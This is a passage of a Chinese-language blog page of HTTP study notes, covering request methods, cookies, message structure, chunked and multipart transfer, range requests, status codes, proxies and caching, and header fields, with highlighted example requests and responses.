punctuation">:</span> <span class="token header-value">text/html </span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1560（1560 字节的数据</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">响应返回状态码  204 No Content（比如  ：该  html 已存在于服务器上） <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEAD：获得报文首部<br>HEAD 方法和  GET 方法一样，只是不返回报文主体部分。用于确认 URI 的有效性及资源更新的日期时间等。</p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">HEAD</span> <span class="token request-target url">/index.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">返回index.html有关的响应首部 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETE：删除文件<br>DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按 请求 URI 删除指定的资源。</p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">DELETE</span> <span class="token request-target url">/example.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">响应返回状态码  204 No Content（比如  ：该  html 已从该服务器上删除） <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>OPTIONS：询问支持的方法<br>OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。 </p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">OPTIONS * HTTP/1.1 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span><span class="token header"><span class="token header-name keyword">Allow</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, HEAD, OPTIONS （返回服务器支持的方法） </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="TRACK"><a href="#TRACK" class="headerlink" title="TRACK"></a>TRACK</h4><p>TRACE：追踪路径<br>TRACE 方法是让  Web 服务器端将之前的请求通信环回给客户端的方 法。<br>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服 务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应</p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">TRACE</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Max-Forwards</span><span class="token punctuation">:</span> <span class="token header-value">2 </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">message/http </span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1024 </span></span><span class="token request-line"><span class="token method property">TRACE</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Max-Forwards</span><span class="token punctuation">:</span> <span class="token header-value">2（返回响应包含请求内容） </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h4><p>CONNECT：要求用隧道协议连接代理<br>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协 议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接 层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容 加 密后经网络隧道传输。<br>CONNECT 方法的格式如下所示。 </p><p>CONNECT 代理服务器名:端口号    HTTP版本 </p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">CONNECT proxy.hackr.jp:8080 HTTP/1.1 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">proxy.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK（之后进入网络隧道） </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/bc16fc0bdc1aef2e1d96c95a7305119b.png"></p><h3 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h3><p>持久连接旨在建立 1 次 TCP 连接后进行多次请求和响应的交互</p><h4 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h4><p>不等待响应，直接发送下一个请求</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p><img src="https://images.dadream.eu.org/images/2024/07/be4b0058f89df48262095fa3817ef763.png"><img src="https://images.dadream.eu.org/images/2024/07/bafece7685c6f5723d0be0b8d9900781.png"></p><p>请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/image/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sid=1342077140226724</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>响应：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 12 Jul 2012 07:12:20 GMT</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache</span></span>＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain; charset=UTF-8</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="https://images.dadream.eu.org/images/2024/07/3cc4a6cf42aa0161d3b83ff598b01724.png"><img src="https://images.dadream.eu.org/images/2024/07/3ad6ac069f66bb198aba64a2803ea8ad.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/42f1143b5ce8261c3255e62dd8e28d32.png"></p><h3 id="压缩传输"><a href="#压缩传输" class="headerlink" title="压缩传输"></a>压缩传输</h3><p>常用的内容编码有以下几种：<br>gzip（GNU zip）<br>compress（UNIX 系统的标准压缩）<br>deflate（zlib）<br>identity（不进行编码）</p><h3 id="分割发送的分块传输编码"><a href="#分割发送的分块传输编码" class="headerlink" title="分割发送的分块传输编码"></a>分割发送的分块传输编码</h3><p>分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六 进制来标记块的大小，而实体主体的最后一块会使用“0(CR+LF)”来标记。<br>使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编 码前的实体主体。</p><h3 id="发送多种数据的多部分对象集合"><a href="#发送多种数据的多部分对象集合" class="headerlink" title="发送多种数据的多部分对象集合"></a>发送多种数据的多部分对象集合</h3><ul><li><p>multipart/form-data（文件上传时）</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=AaB03x</span></span>--AaB03x<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="field1"</span></span>Joe Blow--AaB03x<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="pics"; filename="file1.txt"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span><span class="token text-plain">...（file1.txt的数据）...--AaB03x--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>multipart/byteranges</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">206</span> <span class="token reason-phrase string">Partial Content</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 13 Jul 2012 02:45:26 GMT</span></span><span class="token header"><span class="token header-name keyword">Last-Modified</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 31 Aug 2007 02:02:20 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/byteranges; boundary=THIS_STRING_SEPARATES</span></span>--THIS_STRING_SEPARATES<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/pdf</span></span><span class="token header"><span class="token header-name keyword">Content-Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes 500-999/8000</span></span>...（范围指定的数据）...--THIS_STRING_SEPARATES<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/pdf</span></span><span class="token header"><span class="token header-name keyword">Content-Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes 7000-7999/8000</span></span>...（范围指定的数据）...--THIS_STRING_SEPARATES--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>使用 boundary 字符串来划分多部分对象集合指明的各类实体。在boundary 字符串指定的各个实体的起始行之前插入“–”标记（例如：–AaB03x、–THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入“–”标记（例如：–AaB03x–、–THIS_STRING_SEPARATES–）作为结束。</p><h3 id="获取部分内容的范围请求（分段请求）"><a href="#获取部分内容的范围请求（分段请求）" class="headerlink" title="获取部分内容的范围请求（分段请求）"></a>获取部分内容的范围请求（分段请求）</h3><p><img src="https://images.dadream.eu.org/images/2024/07/702457428b380409f065b3cb6853fd08.png"></p><p>从一开始到  3000 字节和  5000~7000 字节，8000到之后全部的多重范围</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=-3000, 5000-7000 ,8000-</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h3><p>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然 后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字 符集、编码方式等作为判断的基准。</p><p>参照头</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">Accept Accept-CharsetAccept-Encoding Accept-Language Content-Language<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内容协商技术</p><ul><li>服务器驱动协商</li><li>客户端驱动协商</li><li>透明协商</li></ul><h2 id="HTTP返回状态码"><a href="#HTTP返回状态码" class="headerlink" title="HTTP返回状态码"></a>HTTP返回状态码</h2><h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><p><img src="https://images.dadream.eu.org/images/2024/07/448efd6d806b88b6d8ae97140bafec53.png"></p><h4 id="2XX"><a href="#2XX" class="headerlink" title="2XX"></a>2XX</h4><p>2XX 的响应结果表明请求被正常处理了</p><h5 id="200OK"><a href="#200OK" class="headerlink" title="200OK"></a>200OK</h5><p>表示从客户端发来的请求在服务器端被正常处理了，get请求回返回实体，head请求返回实体首部</p><h5 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h5><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。（浏览器不更新页面）</p><h5 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h5><p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。</p><h4 id="3XX重定向"><a href="#3XX重定向" class="headerlink" title="3XX重定向"></a>3XX重定向</h4><p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p><h5 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h5><p>永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。</p><h5 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h5><p>临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。不更新书签，仍保留产生302的url</p><h5 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h5><p>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。例如，post方法请求时，处理结果希望客服端采用get方法获取资源</p><h5 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h5><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。</p><p>附带条件的请求是指采用 GET方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。</p><h5 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h5><h4 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h4><p>4XX 的响应结果表明客户端是发生错误的原因所在。</p><h5 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h5><p>该状态码表示请求报文中存在语法错误。修改报文再发送。和200异曲同工</p><h5 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h5><p>该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。</p><p>返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询（challenge）用户信息。</p><p>首次返回一个认证框，再返回就是认证失败</p><h5 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h5><p>该状态码表明对请求资源的访问被服务器拒绝了。</p><h5 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h5><p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p><h4 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h4><p>5XX 的响应结果表明服务器本身发生错误。</p><h5 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h5><p>该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web应用存在的 bug 或某些临时的故障。</p><h5 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h5><p>该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p><h3 id="samll-tips"><a href="#samll-tips" class="headerlink" title="samll_tips"></a>samll_tips</h3><p>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。</p><h2 id="与-HTTP-协作的-Web-服务器"><a href="#与-HTTP-协作的-Web-服务器" class="headerlink" title="与 HTTP 协作的 Web 服务器"></a>与 HTTP 协作的 Web 服务器</h2><h3 id="用单台虚拟主机实现多个域名"><a href="#用单台虚拟主机实现多个域名" class="headerlink" title="用单台虚拟主机实现多个域名"></a>用单台虚拟主机实现多个域名</h3><p>一台服务器托管了两个域名，<a href="http://www.hacker.com,www.hacker2.com,两个域名托管在一个虚拟机,则dns解析后ip相同,两个域名会访问一个ip.在相同的/">www.hacker.com,www.hacker2.com，两个域名托管在一个虚拟机，则DNS解析后IP相同，两个域名会访问一个IP。在相同的</a> IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 Host 首部内完整指定主机名或域名的 URI。</p><h3 id="通信数据转发程序-：代理、网关、隧道"><a href="#通信数据转发程序-：代理、网关、隧道" class="headerlink" title="通信数据转发程序 ：代理、网关、隧道"></a>通信数据转发程序 ：代理、网关、隧道</h3><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。</p><p>代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。</p><p><img src="https://images.dadream.eu.org/images/2024/07/5cb86cda8dff1fbdc1eb32bde62d73c6.png"></p><p>每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息</p><h5 id="代理方法"><a href="#代理方法" class="headerlink" title="代理方法"></a>代理方法</h5><p>1.缓存代理</p><p>代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。再次收到相同的资源请求就会返回代理上缓存的资源。</p><p>2.透明代理</p><p>转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</p><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。</p><p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。<br>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。</p><p><img src="https://images.dadream.eu.org/images/2024/07/1d46d1ae5f16e09805d3e87e506383c5.png"></p><h4 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h4><p>隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。</p><p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br>隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。</p><p><img src="https://images.dadream.eu.org/images/2024/07/1abf8e9495373ad8e481c44cd93d8968.png"></p><h3 id="保存资源的缓存"><a href="#保存资源的缓存" class="headerlink" title="保存资源的缓存"></a>保存资源的缓存</h3><p>缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。</p><h4 id="缓存的有效期限"><a href="#缓存的有效期限" class="headerlink" title="缓存的有效期限"></a>缓存的有效期限</h4><p>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。</p><h4 id="客户端的缓存"><a href="#客户端的缓存" class="headerlink" title="客户端的缓存"></a>客户端的缓存</h4><p>缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以Internet Explorer 程序为例，把客户端缓存称为临时网络文件（Temporary Internet File）。<br>浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。</p><h3 id="HTTP-出现之前的协议"><a href="#HTTP-出现之前的协议" class="headerlink" title="HTTP 出现之前的协议"></a>HTTP 出现之前的协议</h3><ol><li>FTP（File Transfer Protocol）<br>传输文件时使用的协议。</li><li>NNTP（Network News Transfer Protocol）<br>用于 NetNews 电子会议室内传送消息的协议。。</li><li>Archie<br>搜索 anonymous FTP 公开的文件信息的协议。</li><li>WAIS（Wide Area Information Servers）<br>以关键词检索多个数据库使用的协议。</li><li>Gopher<br>查找与互联网连接的计算机内信息的协议。</li></ol><h2 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h2><h3 id="HTTP-报文首部"><a href="#HTTP-报文首部" class="headerlink" title="HTTP 报文首部"></a>HTTP 报文首部</h3><p><img src="https://images.dadream.eu.org/images/2024/07/cdd775e3a5788d5f6b3083052c3eb339.png"></p><p>HTTP 协议的请求和响应报文中必定包含 HTTP 首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。</p><h4 id="HTTP-请求报文"><a href="#HTTP-请求报文" class="headerlink" title="HTTP 请求报文"></a>HTTP 请求报文</h4><p><img src="https://images.dadream.eu.org/images/2024/07/34f0690cdfd988547a148806ba15ffb5.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,</span></span>*/*; q=0.8<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">ja,en-us;q=0.7,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span class="token header"><span class="token header-name keyword">If-Modified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 31 Aug 2007 02:02:20 GMT</span></span><span class="token header"><span class="token header-name keyword">If-None-Match</span><span class="token punctuation">:</span> <span class="token header-value">"45bae1-16a-46d776ac"</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTTP-响应报文"><a href="#HTTP-响应报文" class="headerlink" title="HTTP 响应报文"></a>HTTP 响应报文</h4><p><img src="https://images.dadream.eu.org/images/2024/07/d9a94837fa995200e34533dd7640b88c.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">304</span> <span class="token reason-phrase string">Not Modified</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 07 Jun 2012 07:21:36 GMT</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Etag</span><span class="token punctuation">:</span> <span class="token header-value">"45bae1-16a-46d776ac"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP-首部字段"><a href="#HTTP-首部字段" class="headerlink" title="HTTP 首部字段"></a>HTTP 首部字段</h3><h4 id="HTTP-首部字段传递重要信息"><a href="#HTTP-首部字段传递重要信息" class="headerlink" title="HTTP 首部字段传递重要信息"></a>HTTP 首部字段传递重要信息</h4><h4 id="HTTP-首部字段结构"><a href="#HTTP-首部字段结构" class="headerlink" title="HTTP 首部字段结构"></a>HTTP 首部字段结构</h4><p>HTTP 首部字段是由首部字段名和字段值构成的</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">首部字段名: 字段值<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html</span></span><span class="token header"><span class="token header-name keyword">Keep-Alive</span><span class="token punctuation">:</span> <span class="token header-value">timeout=15, max=100</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>若 <strong>HTTP</strong> 首部字段重复了会如何</p><p> 不同浏览器解析方式不同，有的是解析前面，有的则是解析后面的</p><h4 id="4-种-HTTP-首部字段类型"><a href="#4-种-HTTP-首部字段类型" class="headerlink" title="4 种 HTTP 首部字段类型"></a><strong>4</strong> 种 <strong>HTTP</strong> 首部字段类型</h4><ol><li>通用首部字段（<strong>General</strong> <strong>Header Fields</strong>）</li></ol><p>请求报文和响应报文两方都会使用的首部。</p><ol start="2"><li>请求首部字段（<strong>Request Header Fields</strong>）</li></ol><p>从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</p><ol start="3"><li>响应首部字段（<strong>Response Header Fields</strong>）</li></ol><p>从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</p><ol start="4"><li>实体首部字段（<strong>Entity Header Fields</strong>）</li></ol><p>针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息</p><h4 id="HTTP-1-1-首部字段一览"><a href="#HTTP-1-1-首部字段一览" class="headerlink" title="HTTP/1.1 首部字段一览"></a>HTTP/1.1 首部字段一览</h4><p>RFC2616 中定义的 47 种首部字段</p><h5 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h5><table><thead><tr><th align="left">首部字段名</th><th>说明</th></tr></thead><tbody><tr><td align="left">Cache-Control</td><td>控制缓存的行为</td></tr><tr><td align="left">Connection</td><td>逐跳首部、连接的管理</td></tr><tr><td align="left">Date</td><td>创建报文的日期时间</td></tr><tr><td align="left">Pragma</td><td>报文指令</td></tr><tr><td align="left">Trailer</td><td>报文末端的首部一览</td></tr><tr><td align="left">Transfer-Encoding</td><td>指定报文主体的传输编码方式</td></tr><tr><td align="left">Upgrade</td><td>升级为其他协议</td></tr><tr><td align="left">Via</td><td>代理服务器的相关信息</td></tr><tr><td align="left">Warning</td><td>错误通知</td></tr></tbody></table><h5 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept</td><td>用户代理可处理的媒体类型</td></tr><tr><td>Accept-Charset</td><td>优先的字符集</td></tr><tr><td>Accept-Encoding</td><td>优先的内容编码</td></tr><tr><td>Accept-Language</td><td>优先的语言（自然语言）</td></tr><tr><td>Authorization</td><td>Web认证信息</td></tr><tr><td>Expect</td><td>期待服务器的特定行为</td></tr><tr><td>From</td><td>用户的电子邮箱地址</td></tr><tr><td>Host</td><td>请求资源所在服务器</td></tr><tr><td>If-Match</td><td>比较实体标记（ETag）</td></tr><tr><td>If-Modified-Since</td><td>比较资源的更新时间</td></tr><tr><td>If-None-Match</td><td>比较实体标记（与 If-Match 相反）</td></tr><tr><td>If-Range</td><td>资源未更新时发送实体 Byte 的范围请求</td></tr><tr><td>If-Unmodified-Since</td><td>比较资源的更新时间（与If-Modified-Since相反）</td></tr><tr><td>Max-Forwards</td><td>最大传输逐跳数</td></tr><tr><td>Proxy-Authorization</td><td>代理服务器要求客户端的认证信息</td></tr><tr><td>Range</td><td>实体的字节范围请求</td></tr><tr><td>Referer</td><td>对请求中 URI 的原始获取方</td></tr><tr><td>TE</td><td>传输编码的优先级</td></tr><tr><td>User-Agent</td><td>HTTP  